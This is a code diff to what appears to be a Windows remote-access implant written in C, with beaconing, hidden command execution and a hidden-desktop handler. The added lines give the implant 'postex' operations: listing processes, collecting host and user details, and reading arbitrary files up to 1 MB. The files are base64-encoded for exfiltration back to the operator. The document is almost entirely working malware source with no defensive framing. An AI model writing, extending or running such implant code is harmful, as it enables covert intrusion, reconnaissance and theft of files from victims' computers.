@@ -461,6 +461,43 @@ static char* http_post(const wchar_t *path, const char *data) {
 static int g_beacon_sleep = BEACON_SLEEP;
 
 static char* execute_command(const char *cmd) {
+    const char *run = cmd;
+    if (strncmp(cmd, "__px:", 5) == 0) {
+        const char *op = cmd + 5;
+        if (strcmp(op, "ps") == 0) {
+            run = "tasklist";
+        } else if (strcmp(op, "recon") == 0) {
+            char host[256] = "unknown", user[256] = "unknown", cwd[MAX_PATH] = ".";
+            DWORD n = sizeof(host);
+            GetComputerNameA(host, &n);
+            n = sizeof(user);
+            GetUserNameA(user, &n);
+            GetCurrentDirectoryA(MAX_PATH, cwd);
+            char *out = (char *)malloc(1024);
+            snprintf(out, 1024, "host=%s user=%s cwd=%s", host, user, cwd);
+            return out;
+        } else if (strncmp(op, "download:", 9) == 0) {
+            FILE *fh = fopen(op + 9, "rb");
+            if (!fh) return _strdup("Error: not a file");
+            fseek(fh, 0, SEEK_END);
+            long sz = ftell(fh);
+            fseek(fh, 0, SEEK_SET);
+            if (sz < 0 || sz > 1024 * 1024) { fclose(fh); return _strdup("Error: file too large"); }
+            unsigned char *buf = (unsigned char *)malloc((size_t)sz);
+            fread(buf, 1, (size_t)sz, fh);
+            fclose(fh);
+            size_t b64len = 0;
+            char *b64 = base64_encode(buf, (size_t)sz, &b64len);
+            free(buf);
+            char *out = (char *)malloc(5 + b64len + 1);
+            memcpy(out, "FILE:", 5);
+            memcpy(out + 5, b64, b64len + 1);
+            free(b64);
+            return out;
+        } else {
+            return _strdup("Error: unknown postex op");
+        }
+    }
     if (strncmp(cmd, "__hd:", 5) == 0) {
         char *hidden_desktop(const char *cmd);
         return hidden_desktop(cmd);
@@ -492,7 +529,7 @@ static char* execute_command(const char *cmd) {
     PROCESS_INFORMATION pi;
 
     char cmdline[2048];
-    snprintf(cmdline, sizeof(cmdline), "cmd /c %s", cmd);
+    snprintf(cmdline, sizeof(cmdline), "cmd /c %s", run);
 
     if (!CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                         CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
